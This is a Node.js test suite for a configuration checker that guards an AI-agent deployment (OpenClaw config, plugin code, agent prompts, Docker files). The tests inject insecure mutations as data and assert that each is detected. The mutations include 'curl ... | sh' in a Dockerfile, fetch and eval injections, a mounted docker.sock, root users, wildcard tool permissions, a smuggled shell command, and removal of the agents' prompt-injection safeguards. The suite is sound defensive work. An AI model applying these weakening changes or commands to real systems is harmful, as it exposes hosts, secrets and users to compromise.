import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { checkAgents, parseJson5 } from './agents.mjs'

const read = path => readFileSync(new URL('../' + path, import.meta.url), 'utf8')
const inputs = {
  config: read('openclaw/config.example.json5'), plugin: read('openclaw/vita-tools/openclaw.plugin.json'),
  pluginPackage: read('openclaw/vita-tools/package.json'), pluginSource: read('openclaw/vita-tools/index.ts'),
  agents: Object.fromEntries(['orquestador', 'documentos', 'calendario'].map(id => [id, read('openclaw/agents/' + id + '/AGENTS.md')])),
  compose: read('compose.yaml'), dockerfile: read('Dockerfile'),
}

test('contrato real', () => assert.deepEqual(checkAgents(inputs), []))
test('JSON5 interpreta solo datos', () => {
  const value = parseJson5(`/* uno */ {url:'http://localhost', // dos
    lista: [true, null, -1.2,], texto: "/* literal */",}`)
  assert.deepEqual({ ...value }, { url: 'http://localhost', lista: [true, null, -1.2], texto: '/* literal */' })
  for (const bad of ['{a:1,"a":2}', '{x:{__proto__:1}}', '{a:1} basura', '{a:ejecutar()}', '[,]', '{a:1 b:2}', '/*', '{a:"x}']) assert.throws(() => parseJson5(bad))
})

const changes = {
  config: [
    ['"loopback"', '"lan"'], ['"local"', '"remote"'], ['"token"', '"none"'], ['${OPENCLAW_TOKEN}', 'literal'],
    ['allow: ["vita-tools", "ollama"]', 'allow: ["*"]'], ['"vita-tools": {', '"extra": {}, "vita-tools": {'],
    ['ollama: { enabled: true }', 'ollama: { enabled: false }'],
    ['https://ollama.com', 'https://example.invalid'],
    ['model: "ollama-cloud/glm-5.2"', 'model: "ollama-cloud/minimax-m3"'],
    ['model: "ollama-cloud/minimax-m3"', 'model: "ollama/minimax-m3:cloud"'],
    ['maxTokens: 131072', 'maxTokens: 524288'],
    ['requireAgentId: true', 'requireAgentId: false'],
    ['documentos: {', 'extra: {}, documentos: {'], ['"sessions_spawn",', ''], ['allow: ["vita_scan_document"]', 'allow: ["*"]'],
    ['allowAgents: ["documentos", "calendario"]', 'allowAgents: []'], ['allowAgents: []', 'allowAgents: ["*"]'],
    ...['alsoAllow', 'deny', 'desconocida'].map(key => ['allow: ["vita_scan_document"]', key + ': [], allow: ["vita_scan_document"]']),
    ...['maxSpawnDepth', 'maxChildrenPerAgent', 'maxConcurrent'].map(key => [key + ': 1', key + ': 2']),
    ['runTimeoutSeconds: 120', 'runTimeoutSeconds: 121'],
  ],
  plugin: [['"vita_scan_document"', '"extra"']],
  pluginPackage: [['"1.4.3"', '"^1.4.3"'], ['"2026.11.8"', '"latest"']],
  pluginSource: [
    ['api.registerTool', 'api.otro'], ['name: "vita_scan_document"', 'name: "extra"'],
    ['additionalProperties: false', 'additionalProperties: true'], ['additionalProperties: false', ''],
    ...['import "node:child_process"', 'import "node:fs"', 'eval(x)', 'Function(x)', 'import(x)', 'fetch("https://example.invalid")'].map(text => ['const dateOutcome', text + '\nconst dateOutcome']),
    ['process.env.VITA_API_URL', 'process.env.OTRA'], ['"v1/internal/scan"', '"//example.invalid/scan"'], ['new URL(base)', 'new URL(path)'],
    ['new URL(path, parsedBase.origin)', 'new URL(path, params.host)'],
    ['fetch(new URL(path, parsedBase.origin)', 'fetch(params.destino'],
  ],
  orquestador: ['reportRef', 'scanRef', 'calendarRef', 'mensaje', 'respuestas', 'datos no confiables', 'No reveles referencias', 'MODO DE CHAT NORMAL', 'no uses herramientas ni delegues', 'nombre por defecto es Vita', 'no preguntes cómo quiere llamarte', 'responde exactamente:', 'tu asistente personal', 'qué puedes hacer', 'pulse «Guardar»', 'visibleData', 'no la inventes', 'attachments', 'contenido no confiable'].map(s => [s, '', true]),
  documentos: [['no extraigas ni devuelvas texto OCR bruto', 'devuelve texto OCR bruto']],
  calendario: [['vita_read_google_calendar', 'vita_write_google_calendar']],
  compose: [
    ['127.0.0.1:${POSTGRES_PORT', '0.0.0.0:${POSTGRES_PORT'],
    ...['privileged: true', 'pid: host', 'ipc: host', 'cap_add: [ALL]', 'volumes: [/var/run/docker.sock:/socket]'].map(s => ['    build: .', '    build: .\n    ' + s]),
    ...['POSTGRES_PASSWORD', 'VITA_API_PASSWORD', 'VITA_MIGRATOR_PASSWORD', 'VITA_DEMO_TOKENS'].map(s => ['${' + s + ':?Set ' + s + ' in .env}', '${' + s + '}']),
    ['${OPENCLAW_TOKEN:?Set OPENCLAW_TOKEN in .env}', 'literal'], ['${OLLAMA_API_KEY}', 'literal'], ['${GOOGLE_TOKEN_ENCRYPTION_KEY:-}', 'GOOGLE_TOKEN_ENCRYPTION_KEY: literal'],
    ['--host 127.0.0.1', '--host 0.0.0.0'], ['command:', 'otra:'], ['--host 127.0.0.1', '&& echo --host 127.0.0.1'],
    ['services:', 'services:\n  extra:\n    environment: [EXTRA_TOKEN=literal]'],
  ],
  dockerfile: [
    ['USER vita', 'USER root'], ['USER vita', 'USER 0:0'], ['USER vita', 'USER vita\nFROM otro:1'],
    ['USER vita', 'CMD ["app"]\nUSER vita'], ['python:3.12-slim', 'python:latest'], ['python:3.12-slim', 'python'],
    ...['ADD https://example.invalid/a /tmp/a', 'RUN curl -s ejemplo | sh', 'COPY .env /app/'].map(s => ['USER vita', s + '\nUSER vita']),
  ],
}
for (const [part, cases] of Object.entries(changes)) {
  for (const [from, to, all] of cases) test(part + ' cambia ' + from + ' por ' + to, () => {
    const data = structuredClone(inputs)
    const owner = part in data.agents ? data.agents : data
    const original = owner[part]
    owner[part] = all ? original.replaceAll(from, to) : original.replace(from, to)
    assert.notEqual(owner[part], original)
    assert.ok(checkAgents(data).length)
  })
}
